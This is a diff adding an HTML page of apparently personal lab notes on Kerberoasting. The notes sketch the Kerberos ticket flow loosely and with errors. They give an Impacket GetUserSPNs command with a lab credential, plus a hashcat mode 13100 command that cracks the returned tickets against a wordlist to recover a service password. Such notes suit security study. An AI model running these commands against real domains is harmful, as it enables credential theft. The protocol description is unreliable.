@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Kerberoasting</title>
+</head><body><img src="image.png" /><br/>
+<br/>
+<br/>
+DC:also called key distributin center(KDC)<br/>
+<br/>
+1)User requests for TGT(Ticket granting ticket) and provides its ntlm hash<br/>
+2)DC going to send TGT and encrypt it with kerberos TGT hash<br/>
+apllication server is any service provided eg: sql service , antivirus service and it has an SPN(service principle name)<br/>
+3)In order to access a service, we have to get a TGS(tiket granting service), we request TGS by sending TGT<br/>
+4) we receive TGS along with servers account hash<br/>
+5)we send TGS to application server along with the hash,ther server decrypts the hash,matches it with its own hash to see if its correct and then we can use the service<br/>
+6)we get authenticated and can use the service<br/>
+<br/>
+<br/>
+#GetUsersSPNs.py marvel.local/fcastle:P@ssword dc-ip &lt;DCIP&gt; -request<br/>
+-dc-ip:IP of domain controller<br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+#hashcat -m 13100 -krtgt.txt /usr/share/wordlists/rockyou.txt<br/>
+<img src="image 4.png" /><br/>
+<br/>
+this &nbsp;is the password of the server<br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+<br/>
+</body></html>
